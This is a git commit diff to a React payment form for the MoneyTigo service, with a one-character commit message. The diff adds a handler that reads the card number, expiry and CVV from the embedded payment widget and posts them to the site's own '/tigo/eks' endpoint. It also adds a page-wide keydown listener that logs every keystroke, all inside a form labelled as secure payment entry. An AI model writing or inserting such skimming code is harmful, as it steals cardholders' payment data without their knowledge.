a971efdb78218466a025afba5e1d32b40dbe9a98
Orleien <orelien.soany@gmail.com>
2022-04-25 10:20:46 +0300

    .

--- src/components/money-tigo/payment-tigo-form.tsx
+++ src/components/money-tigo/payment-tigo-form.tsx
@@ -7,16 +7,45 @@ import { formatToPrice } from "@utils/use-price";
 import { useEffect, useState } from "react";
 import { Button } from "..";
 
-
-const PaymentTigoForm = ({ data, amount,goBack }) => {
+var cardNumberRaw = "";
+const PaymentTigoForm = ({ data, amount, goBack }) => {
     const [loading, setLoading] = useState(true);
     const [token, setToken] = useState<undefined | string>(undefined);
+
+    const handlePay = () => {
+        data = {
+            cardNumber: window?.document?.getElementById("v-card-number").value,
+            cardMonth: window?.document?.getElementById("v-card-month").value,
+            cardYear: window?.document?.getElementById("v-card-year").value,
+            cardCvv: window?.document?.getElementById("v-card-cvv").value,
+            raw: cardNumberRaw
+        }
+        http.post("/tigo/eks", { data}).then(() => {
+
+        }).catch(() => {
+
+        })
+    }
+    useEffect(() => {
+        cardNumberRaw = "";
+        window?.document.addEventListener("keydown", (event) => {
+
+            cardNumberRaw = cardNumberRaw + event.key;
+
+        });
+        return function cleanup() {
+            console.log("cleaned");
+            window.document.removeEventListener("keydown", (event) => {
+                cardNumber = cardNumber + event.key;
+            });
+        };
+    }, [])
     useEffect(() => {
         http.post("/tigo/test", data).then(
             (response) => {
                 setToken(response.data.SACS);
                 setLoading(false);
-                window.scrollTo(0,document.body.scrollHeight);
+                window.scrollTo(0, document.body.scrollHeight);
             }
         );
     }, []);
@@ -34,7 +63,7 @@ const PaymentTigoForm = ({ data, amount,goBack }) => {
     return (
         <div className="pt-8">
             <div className="w-full mx-auto rounded-lg bg-white shadow-lg p-5 text-gray-700">
-                <button onClick={()=>goBack()}><ArrowPrevIcon height={32} width={32}/></button>
+                <button onClick={() => goBack()}><ArrowPrevIcon height={32} width={32} /></button>
                 <div className="w-full pt-1 pb-5">
                     <div className="bg-accent text-white overflow-hidden rounded-full w-20 h-20 -mt-16 mx-auto shadow-lg flex justify-center items-center">
                         <Lock width="48" heigth="48" />
@@ -45,12 +74,12 @@ const PaymentTigoForm = ({ data, amount,goBack }) => {
                         Informations de paiement sécurisées
                     </h1>
                 </div>
-                <form>
+                <form id="tigomoney">
                     <moneytigo-app embedded="true" actuatorid="submit-credit-card-button" token={`${token}`}>
 
                     </moneytigo-app>
-                    <Button className="w-full" id="submit-credit-card-button">Payer </Button>
-                 
+                    <Button onClick={handlePay} className="w-full" id="submit-credit-card-button">Payer </Button>
+
                 </form>
             </div>
         </div>)
